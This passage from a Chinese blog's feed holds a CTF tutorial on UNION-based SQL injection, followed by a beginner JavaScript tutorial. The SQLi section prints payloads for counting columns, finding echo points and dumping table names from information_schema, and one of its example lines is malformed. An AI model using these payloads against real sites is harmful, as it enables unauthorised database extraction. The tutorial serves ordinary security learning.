    <content type="html"><![CDATA[<h2 id="联合查询介绍"><a href="#联合查询介绍" class="headerlink" title="联合查询介绍"></a>联合查询介绍</h2><p><strong>联合查询语句：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select a from b union select c from d where e;</span><br></pre></td></tr></table></figure><p><strong>使用条件</strong>：页面对查询语句有<strong>回显查询数据</strong></p><p><strong>注意事项</strong>：</p><ul><li><p>使用联合查询注入时,位于union前的语句不要出现查询的结果(后端只选择查询结果第一行的情况，若前一部分可以被查询，则联合查询的部分不会回显)</p></li><li><p>若前部分有结果，可在每次的<code>union</code>查询后添加语句<code>limit n,1</code>(n根据题目实际进行切换)起到回显联合查询结果的作用</p><p>注：limit num1，num2的作用为<strong>从第num1行开始显示num2行内容</strong></p></li></ul><h2 id="所需函数"><a href="#所需函数" class="headerlink" title="所需函数"></a>所需函数</h2><p><strong>1.</strong><code>concat()</code>函数</p><p>​<code>concat()</code>函数：将多个<strong>不同字段</strong>的字符串连接成一个字符串。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">concat(str1，str2) #语法</span><br></pre></td></tr></table></figure><p>注意：返回结果为连接参数产生的字符串，如果有任何一个参数为null，则返回值为null。</p><p><strong>2.</strong><code>group_concat()</code>函数</p><p>​<code>group_concat()</code> 将多个<strong>同个字段</strong>的字符串连接成一个字符串。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">group_concat( [<span class="keyword">distinct</span>] 要连接的字段 [<span class="keyword">order</span> <span class="keyword">by</span> 排序字段 <span class="keyword">asc</span><span class="operator">/</span><span class="keyword">desc</span>] [separator ‘分隔符’]) #语法</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h2 id="注入流程"><a href="#注入流程" class="headerlink" title="注入流程"></a>注入流程</h2><ol><li><h3 id="判断类型"><a href="#判断类型" class="headerlink" title="判断类型"></a>判断类型</h3><p>链接：<a href="/posts/3000552397/#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9">SQL注入-基础 | WELLS Blog</a></p></li><li><h3 id="字段数"><a href="#字段数" class="headerlink" title="字段数"></a>字段数</h3><p>联合查询(<code>union</code>)，必选保证<code>union</code>前后两个查询的字段数一致，即两个查询结果有相同的<strong>列数</strong>，因此要对前一个的字段数进行判断。可以使用<code>order by 数字</code>进行判断</p><p><strong>注</strong>：<code>order by n</code>表示查询结果通过第n个字段进行排序</p><p>使用示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; order by 1 --+</span><br></pre></td></tr></table></figure><p>使用时不断增大数字，假设直至第<code>n</code>个出现错误，从而判断出字段数为<code>n-1</code></p></li><li><h3 id="回显点"><a href="#回显点" class="headerlink" title="回显点"></a>回显点</h3><p>知道字段数之后，我们还需要确定在哪个字段是回显到页面上的</p><p>直接根据字段数，联合查询数字<code>1，2，3...</code>,以三个字段数为例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; order by union select 1,2,3 --+</span><br></pre></td></tr></table></figure><p>从页面上查找回显的是哪个数字</p></li><li><h3 id="爆库名、表名，字段名，数据"><a href="#爆库名、表名，字段名，数据" class="headerlink" title="爆库名、表名，字段名，数据"></a>爆库名、表名，字段名，数据</h3></li></ol><p>​使用<code>union</code>语句在回显位置导出数据库中的数据，结合<a href="/posts/3000552397/#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9">SQL注入-基础 | WELLS Blog</a>中的SQL注入常用基础语句</p><p>以2位置为回显点，爆表名为例</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;联合查询介绍&quot;&gt;&lt;a href=&quot;#联合查询介绍&quot; class=&quot;headerlink&quot; title=&quot;联合查询介绍&quot;&gt;&lt;/a&gt;联合查询介绍&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;联合查询语句：&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight </summary>
      
    
    
    
    <category term="CTF" scheme="https://we11s.github.io/categories/CTF/"/>
    
    
    <category term="CTF-Web" scheme="https://we11s.github.io/tags/CTF-Web/"/>
    
    <category term="Web-SQL" scheme="https://we11s.github.io/tags/Web-SQL/"/>
    
  </entry>
  
  <entry>
    <title>初探Python</title>
    <link href="https://we11s.github.io/posts/831263057/"/>
    <id>https://we11s.github.io/posts/831263057/</id>
    <published>2024-02-01T14:03:58.000Z</published>
    <updated>2024-02-03T15:20:37.521Z</updated>
    
    
    
    
    <category term="编程" scheme="https://we11s.github.io/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="开发" scheme="https://we11s.github.io/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript初探索</title>
    <link href="https://we11s.github.io/posts/4105956505/"/>
    <id>https://we11s.github.io/posts/4105956505/</id>
    <published>2024-01-27T11:42:29.000Z</published>
    <updated>2024-02-03T15:02:43.857Z</updated>
    
    <content type="html"><![CDATA[<p>JavaScript 是一种可插入 HTML 页面的轻量级的编程语言。</p><h1 id="初识JavaScript"><a href="#初识JavaScript" class="headerlink" title="初识JavaScript"></a><strong>初识JavaScript</strong></h1><h2 id="JavaScript的功能"><a href="#JavaScript的功能" class="headerlink" title="JavaScript的功能"></a>JavaScript的功能</h2><ol><li>直接写入 HTML 输出流</li><li>对事件的反应</li><li>改变 HTML 内容</li><li>改变 HTML 图像</li><li>改变 HTML 样式</li><li>验证输入</li></ol><h2 id="JavaScript-用法"><a href="#JavaScript-用法" class="headerlink" title="JavaScript 用法"></a>JavaScript 用法</h2><h3 id="内部的-JavaScript"><a href="#内部的-JavaScript" class="headerlink" title="内部的 JavaScript"></a>内部的 JavaScript</h3><p>HTML 中的 Javascript 脚本<strong>代码</strong>必须位于 <code>&lt;script&gt;</code> 与 <code>&lt;/script&gt;</code>标签之间，<strong>加上标签后的代码代码</strong>可被放置在 HTML 页面的 <code>&lt;body&gt;</code> 和 <code>&lt;head&gt;</code> 部分中。</p><h3 id="外部的-JavaScript"><a href="#外部的-JavaScript" class="headerlink" title="外部的 JavaScript"></a>外部的 JavaScript</h3><p>外部 JavaScript 文件的文件扩展名是 .js。使用以下代码，可将代码引入外部的 JavaScript</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;the_url_of_your_.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>​由于混合 JavaScript 和 HTML 会使代码难以维护和理解，所以与CSS一样，将<strong>js代码文件与html文件分离</strong></p><h2 id="JavaScript-运行次序"><a href="#JavaScript-运行次序" class="headerlink" title="JavaScript 运行次序"></a>JavaScript 运行次序</h2><p>当浏览器执行到一段 JavaScript 代码时，通常会按从上往下的顺序执行这段代码。如果 JavaScript 先于要修改的 HTML 和 CSS 加载和运行，则可能发生错误。在引用对象之前必须确保该对象已经存在，对象还不存在，就不能为它增添一个事件监听器。</p><h2 id="脚本调用设置"><a href="#脚本调用设置" class="headerlink" title="脚本调用设置"></a>脚本调用设置</h2><p><strong>异步加载</strong>：指在 HTML 文档解析过程中，同时下载其他资源的过程。</p><h3 id="默认情况"><a href="#默认情况" class="headerlink" title="默认情况"></a>默认情况</h3><p>浏览器会立即下载并执行脚本。这意味着脚本会阻塞 HTML 文档的解析和渲染过程，直到脚本执行完毕。如果脚本文件很大或加载时间较长，这可能会导致页面加载速度变慢。</p><h3 id="异步下载立即执行-限外部JS"><a href="#异步下载立即执行-限外部JS" class="headerlink" title="异步下载立即执行(限外部JS)"></a>异步下载立即执行(限外部JS)</h3><p>带有 <code>async</code> 属性的脚本，浏览器会异步下载脚本文件，并且不会阻塞 HTML 文档的解析和渲染。一旦脚本文件下载完成，浏览器会立即执行它，而不会等待其他资源的加载完成。</p><p><strong><code>async</code> 属性的脚本将在下载完成后立即执行。这将阻塞页面，并不保证任何特定的执行顺序。</strong></p><h3 id="异步下载等待页面渲染后顺序执行"><a href="#异步下载等待页面渲染后顺序执行" class="headerlink" title="异步下载等待页面渲染后顺序执行"></a>异步下载等待页面渲染后顺序执行</h3><h4 id="内部的-JavaScript-1"><a href="#内部的-JavaScript-1" class="headerlink" title="内部的 JavaScript"></a>内部的 JavaScript</h4><p>可以使用以下结构：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;DOMContentLoaded&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 在这里编写你的 JavaScript 代码</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="外部的-JavaScript-1"><a href="#外部的-JavaScript-1" class="headerlink" title="外部的 JavaScript"></a>外部的 JavaScript</h4><p>可以使用了<code>defer</code>标签：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;the_url_of_your_.js&quot;</span> defer&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><strong>带有 <code>defer</code> 属性的脚本将按照它们的顺序加载，并且只有在所有脚本加载完毕后才会执行。</strong></p><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a><strong>总结：</strong></h3><ul><li>如果脚本无需依赖html解析渲染出的对象，且无依赖其他资源独立运行，那么应使用 <code>async</code>。</li><li>如果脚本需要依赖html解析渲染出的对象，或依赖于其他脚本，调用这些脚本时应使用 <code>defer</code>，将关联的脚本按所需顺序置于 HTML 的相应 <code>&lt;script&gt;</code> 元素中。</li></ul><p>一些我奇怪的想法</p><ul><li>如果脚本需要依赖html解析渲染出的对象，但不依赖于其他脚本，使用<code>defer</code>属性</li><li>如果脚本无需要依赖html解析渲染出的对象，且依赖于其他脚本，使用<code>defer</code>属性或者将两个js写在一块，用<code>async</code>属性</li></ul><p>总之一般情况下都用<code>defer</code>，比较万金油，默认模式一般都不推荐使用</p><h1 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a><strong>基础概念</strong></h1><h2 id="函数（Function）"><a href="#函数（Function）" class="headerlink" title="函数（Function）"></a>函数（Function）</h2><p>函数是可复用的代码块，可以一次编写，反复运行，从而节省了大量的重复代码。</p><p>函数的格式包括了关键字 <code>function</code> 、一个函数名、一对小括号定义了一个函数。随后是一对花括号（<code>&#123; &#125;</code>）。花括号内部是调用函数时要运行的所有代码。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">the_name_of_function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  your code;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="事件（Event）"><a href="#事件（Event）" class="headerlink" title="事件（Event）"></a>事件（Event）</h2><p>理想中，我们希望在点击某个按钮时调用某个函数，为此，我们需要使用事件。<strong>事件就是浏览器中发生的事儿</strong>，比如点击按钮、加载页面、播放视频，等等，我们可以通过调用代码来响应事件。侦听事件发生的结构称为<strong>事件监听器</strong>（Event Listener），响应事件触发而运行的代码块被称为<strong>事件处理器</strong>（Event Handler）。</p><h2 id="对象（Object）"><a href="#对象（Object）" class="headerlink" title="对象（Object）"></a>对象（Object）</h2><p>在JavaScript中，一切都是对象。对象是一种复合数据类型(类似C语言的结构体)，它可以包含<strong>属性和方法，由逗号分隔开</strong>。例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义一个对象</span></span><br><span class="line"><span class="keyword">const</span> person = &#123;</span><br><span class="line">  <span class="comment">// 属性</span></span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;John&quot;</span>,</span><br><span class="line">  <span class="attr">age</span>: <span class="number">30</span>,</span><br><span class="line">  <span class="comment">// 方法</span></span><br><span class="line">  <span class="attr">greet</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hello, my name is &quot;</span> + <span class="variable language_">this</span>.<span class="property">name</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>点符号（<code>.</code>）来访问对象的属性和其他方法，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">person.greet(); // 调用对象的方法</span><br></pre></td></tr></table></figure><p>属性是对象的特征或数据是任何JavaScript数据类型，包括字符串、数字、布尔值、数组、甚至其他对象。</p><h2 id="方法（method）"><a href="#方法（method）" class="headerlink" title="方法（method）"></a>方法（method）</h2><p>与对象关联的<strong>函数</strong>。方法是在对象上定义的，它可以访问对象的属性和其他方法，并执行特定的操作。是对象能够执行的操作或行为。可通过浏览器的JavaScript 控制台操作浏览器对象</p><h3 id="函数与方法的差别"><a href="#函数与方法的差别" class="headerlink" title="函数与方法的差别"></a>函数与方法的差别</h3><ol><li><p>归属关系：<strong>方法是与对象关联的函数</strong>。它们通常是在对象的上下文中定义的，并且可以访问对象的属性和其他方法。方法是对象的行为或操作。<strong>函数是独立的代码块</strong>，不依赖于特定的对象。它们可以在任何地方定义和调用，而不需要依赖于对象。</p></li><li><p>调用方式：<strong>方法通过对象来调用。它们使用对象名和方法名的结合形式进行调用</strong>，例如 <code>objectName.methodName()</code>。方法的调用是基于对象的，因此方法可以使用对象的属性和其他方法。<strong>函数可以直接通过函数名进行调用</strong>，例如 <code>functionName()</code>。函数的调用是独立的，不依赖于特定的对象。</p></li><li><p>参数传递：<strong>方法通常将对象本身作为第一个参数传递给方法（通常称为 <code>this</code> 或 <code>self</code>）</strong>，以便在方法内部访问对象的属性和其他方法。方法可以接受其他参数作为输入。函数可以接受任意数量的参数，并且可以通过参数来接收外部值。</p><p>例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> person = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;Wells&quot;</span>,</span><br><span class="line">  <span class="attr">greet</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hello, my name is &quot;</span> + <span class="variable language_">this</span>.<span class="property">name</span>); <span class="comment">//使用this作为对象本身</span></span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">person.<span class="title function_">greet</span>(); <span class="comment">// 输出 &quot;Hello, my name is Wells&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>定义方式：方法是在对象或类的定义中声明的。它们可以使用对象字面量语法或类的方法定义语法进行定义。函数可以在全局范围内或其他函数内部进行定义。它们可以使用函数声明语法或函数表达式语法进行定义。</p></li></ol><h2 id="运算符（Operator）"><a href="#运算符（Operator）" class="headerlink" title="运算符（Operator）"></a>运算符（Operator）</h2><p>JavaScript 运算符允许我们执行比较、做数学运算、连接字符串等等。</p><h3 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h3><table><thead><tr><th align="left">运算符</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">+</td><td align="left">加法</td></tr><tr><td align="left">-</td><td align="left">减法</td></tr><tr><td align="left">*</td><td align="left">乘法</td></tr><tr><td align="left">**</td><td align="left">幂</td></tr><tr><td align="left">&#x2F;</td><td align="left">除法</td></tr><tr><td align="left">%</td><td align="left">取模（余数）</td></tr><tr><td align="left">++</td><td align="left">自增</td></tr><tr><td align="left">–</td><td align="left">自减</td></tr></tbody></table><ul><li><p>自增和自减运算符放置在变量前和变量后与区别（与C语言类似）</p><ol><li>前置自增&#x2F;自减运算符会先对变量进行自增或自减操作，然后返回更新后的值。</li><li>后置自增&#x2F;自减运算符会先返回变量的原始值，然后再对变量进行自增或自减操作。</li></ol></li><li><p>运算符用于把文本值或字符串变量加起来（连接起来）。</p><p>例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">txt1=<span class="string">&quot;What a very&quot;</span>;</span><br><span class="line">txt2=<span class="string">&quot;nice day&quot;</span>;</span><br><span class="line">txt3=txt1+txt2;</span><br></pre></td></tr></table></figure><p>则<code>txt3</code>为<code>What a verynice day</code></p></li><li><p>如果数字与字符串相加，此时数字会被认为是字符串，返回字符串</p><p>例如</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">z=<span class="string">&quot;Hello&quot;</span>+<span class="number">666</span>;</span><br></pre></td></tr></table></figure><p>则<code>z</code>为<code>Hello666</code></p></li></ul><h3 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h3><p>赋值运算符用于给 JavaScript 变量赋值。</p><table><thead><tr><th align="left">运算符</th><th align="left">例子</th><th align="left">等同于</th></tr></thead><tbody><tr><td align="left">&#x3D;</td><td align="left">x&#x3D;y</td><td align="left">（将y赋值给x）</td></tr><tr><td align="left">+&#x3D;</td><td align="left">x+&#x3D;y</td><td align="left">x&#x3D;x+y</td></tr><tr><td align="left">-&#x3D;</td><td align="left">x-&#x3D;y</td><td align="left">x&#x3D;x-y</td></tr><tr><td align="left">*&#x3D;</td><td align="left">x*&#x3D;y</td><td align="left">x&#x3D;x*y</td></tr><tr><td align="left">&#x2F;&#x3D;</td><td align="left">x&#x2F;&#x3D;y</td><td align="left">x&#x3D;x&#x2F;y</td></tr><tr><td align="left">%&#x3D;</td><td align="left">x%&#x3D;y</td><td align="left">x&#x3D;x%y</td></tr></tbody></table><h3 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h3><p>比较运算符在逻辑语句中使用，以测定变量或值是否相等。</p><p>以x&#x3D;5为例：</p><table><thead><tr><th align="left">运算符</th><th align="left">描述</th><th align="left">比较</th><th align="left">返回值</th></tr></thead><tbody><tr><td align="left">&#x3D;&#x3D;</td><td align="left">等于(类型不等时会进行转化)</td><td align="left">x&#x3D;&#x3D;8</td><td align="left"><em>false</em></td></tr><tr><td align="left"></td><td align="left"></td><td align="left">x&#x3D;&#x3D;5</td><td align="left"><em>true</em></td></tr><tr><td align="left"></td><td align="left"></td><td align="left">x&#x3D;&#x3D;”5”</td><td align="left"><em>true</em></td></tr><tr><td align="left">&#x3D;&#x3D;&#x3D;</td><td align="left">严格等于（值和类型均相等）</td><td align="left">x&#x3D;&#x3D;&#x3D;”5”</td><td align="left"><em>false</em></td></tr><tr><td align="left"></td><td align="left"></td><td align="left">x&#x3D;&#x3D;&#x3D;5</td><td align="left"><em>true</em></td></tr><tr><td align="left">!&#x3D;</td><td align="left">不等于</td><td align="left">x!&#x3D;8</td><td align="left"><em>true</em></td></tr><tr><td align="left"></td><td align="left"></td><td align="left">x!&#x3D;”5”</td><td align="left"><em>false</em></td></tr><tr><td align="left">!&#x3D;&#x3D;</td><td align="left">严格不等于（值和类型有一个不相等，或两个都不相等）</td><td align="left">x!&#x3D;&#x3D;”5”</td><td align="left"><em>true</em></td></tr><tr><td align="left"></td><td align="left"></td><td align="left">x!&#x3D;&#x3D;5</td><td align="left"><em>false</em></td></tr><tr><td align="left">&gt;</td><td align="left">大于</td><td align="left">x&gt;8</td><td align="left"><em>false</em></td></tr><tr><td align="left">&lt;</td><td align="left">小于</td><td align="left">x&lt;8</td><td align="left"><em>true</em></td></tr><tr><td align="left">&gt;&#x3D;</td><td align="left">大于或等于</td><td align="left">x&gt;&#x3D;8</td><td align="left"><em>false</em></td></tr><tr><td align="left">&lt;&#x3D;</td><td align="left">小于或等于</td><td align="left">x&lt;&#x3D;8</td><td align="left"><em>true</em></td></tr></tbody></table><p>严格的版本往往导致更少的错误，建议使用这些严格的版本。</p><h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><p>逻辑运算符用于测定变量或值之间的逻辑。</p><table><thead><tr><th align="left">运算符</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">&amp;&amp;</td><td align="left">and（同时成立为真）</td></tr><tr><td align="left">||</td><td align="left">or（一个成立为真）</td></tr><tr><td align="left">!</td><td align="left">not</td></tr></tbody></table><h3 id="条件（三元）运算符"><a href="#条件（三元）运算符" class="headerlink" title="条件（三元）运算符"></a>条件（三元）运算符</h3><p>条件元素运算符把两个结果中其中一个符合运算逻辑的值返回。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">? :</span><br><span class="line">(condition ? ifTrue : ifFalse)</span><br></pre></td></tr></table></figure><p>更多条件运算符参照：</p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators">表达式和运算符 - JavaScript | MDN (mozilla.org)</a></p><h1 id="JavaScript基础"><a href="#JavaScript基础" class="headerlink" title="JavaScript基础"></a><strong>JavaScript基础</strong></h1><p>JavaScript的语句都是<strong>以<code>;</code>作为结束</strong>，缺少<code>;</code>会导致报错</p><h2 id="注释语法"><a href="#注释语法" class="headerlink" title="注释语法"></a>注释语法</h2><h3 id="单行注释"><a href="#单行注释" class="headerlink" title="单行注释"></a>单行注释</h3><ul><li><p>在双斜杠（&#x2F;&#x2F;）后添加单行注释，比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">// 我是一条注释</span><br></pre></td></tr></table></figure></li></ul><h3 id="多行注释"><a href="#多行注释" class="headerlink" title="多行注释"></a>多行注释</h3><ul><li><p>在<code>/*</code>和<code>*/</code>之间添加多行注释，比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">  我也是</span><br><span class="line">  一条注释</span><br><span class="line">*/</span><br></pre></td></tr></table></figure></li></ul><h2 id="声明变量"><a href="#声明变量" class="headerlink" title="声明变量"></a>声明变量</h2><p>声明一个变量，即创建一个变量。</p><p>声明一个变量的语法是在 <code>var</code> 或 <code>let</code> 关键字之后加上这个变量的名字，例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Name2</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="title class_">Name1</span>;</span><br></pre></td></tr></table></figure><h3 id="var-与-let-的区别"><a href="#var-与-let-的区别" class="headerlink" title="var 与 let 的区别"></a><strong>var 与 let 的区别</strong></h3><p>推荐在现代JavaScript中<strong>使用 <code>let</code> 来声明变量</strong></p><ol><li><p>作用域：<strong>使用 <code>var</code> 声明的变量具有函数作用域，而使用 <code>let</code> 声明的变量具有块级作用域。</strong>函数作用域意味着变量在声明它们的函数内部是可见的，而块级作用域意味着变量在声明它们的代码块（例如，<code>&#123;&#125;</code>包括起来的代码块：<code>if</code>语句、循环等）内部是可见的。</p></li><li><p>变量提升：使用 <code>var</code> 声明的变量会发生变量提升，意味着变量在其作用域内的任何位置都是可访问的，即使在变量声明之前也可以访问到。而使用 <code>let</code> 声明的变量不会发生变量提升，它们只能在声明之后才能被访问。</p><p>例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">myName = <span class="string">&quot;Chris&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">logName</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(myName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">logName</span>();<span class="comment">//输出undefined</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> myName;</span><br></pre></td></tr></table></figure><div class="note danger simple"><p>感谢<a href="https://xzb666-hub.github.io/">@Eneed_gl</a>的指错，变量提升（指的是函数声明和变量声明（注意是声明，不包括初始化）会被提升到其所在作用域的最顶部）的时候是不会编译先前初始化的赋值语句的，故此时输出undefined</p></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">console.log(name); // 输出 undefined</span><br><span class="line">var name = &quot;John&quot;;</span><br><span class="line">console.log(name); // 输出 &quot;John&quot;</span><br></pre></td></tr></table></figure><p>​以上代码它仍然可以工作，若替换成let则就会报错</p></li><li><p>重复声明：<strong>使用 <code>var</code> 声明的变量可以被多次声明而不会引发错误，而使用 <code>let</code> 声明的变量在同一作用域内重复声明会引发错误</strong>。</p></li><li><p>全局对象属性：使用 <code>var</code> 声明的变量会成为全局对象（在浏览器中是 <code>window</code> 对象）的属性，而使用 <code>let</code> 声明的变量不会成为全局对象的属性。</p></li></ol><h2 id="变量命名的规则"><a href="#变量命名的规则" class="headerlink" title="变量命名的规则"></a>变量命名的规则</h2><p>使用拉丁字符 (0-9,a-z,A-Z) 和下划线字符。</p><ul><li>你不应当使用规则之外的其他字符，因为它们可能引发错误，或对国际用户来说难以理解。</li><li>变量名不要以下划线开头——以下划线开头的被某些 JavaScript 设计为特殊的含义，因此可能让人迷惑。</li><li>变量名不要以数字开头。这种行为是不被允许的，将会报错。</li><li>变量名大小写敏感——因此<code>myage</code>与<code>myAge</code>是 2 个不同的变量。</li><li>避免使用 JavaScript 的保留字给变量命名。保留字，即是组成 JavaScript 的实际语法的单词</li></ul><h2 id="变量类型"><a href="#变量类型" class="headerlink" title="变量类型"></a>变量类型</h2><p><strong>JavaScript 是一种“动态类型语言”，你不需要指定变量将包含什么数据类型</strong></p><h3 id="数字"><a href="#数字" class="headerlink" title="数字"></a>数字</h3><p>​包括整数也包括浮点数，统称为数字，例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> myAge = <span class="number">17</span>;</span><br></pre></td></tr></table></figure><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><p>​当你给一个变量赋值为字符串时，你需要用单引号或者双引号把值给包起来，例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> prise = <span class="string">&quot;You are smart&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="布尔值"><a href="#布尔值" class="headerlink" title="布尔值"></a>布尔值</h3><p>​布尔值有 2 种：true 或 false，用于进行判断</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> iAmAlive = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><p>​数组将任何类型的元素存储在数组中 - 字符串，数字，对象，另一个变量，甚至另一个数组。也可以混合不同类型元素，<strong>方括号括起来</strong>（区别于C语言），并用<strong>逗号分隔</strong>，最开始的序号为<strong>0</strong>，例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> myNameArray = [<span class="string">&quot;Chris&quot;</span>, <span class="string">&quot;Bob&quot;</span>, <span class="string">&quot;Jim&quot;</span>];</span><br><span class="line"><span class="keyword">let</span> myNumberArray = [<span class="number">10</span>, <span class="number">15</span>, <span class="number">40</span>];</span><br><span class="line"><span class="keyword">let</span> sequence = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">13</span>];</span><br><span class="line"><span class="keyword">let</span> random = [<span class="string">&quot;tree&quot;</span>, <span class="number">795</span>, [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>]];</span><br></pre></td></tr></table></figure><p>其中</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">myNameArray[<span class="number">0</span>]; <span class="comment">// 将得到：Chris</span></span><br><span class="line">myNumberArray[<span class="number">2</span>]; <span class="comment">// 将得到：40</span></span><br></pre></td></tr></table></figure><h3 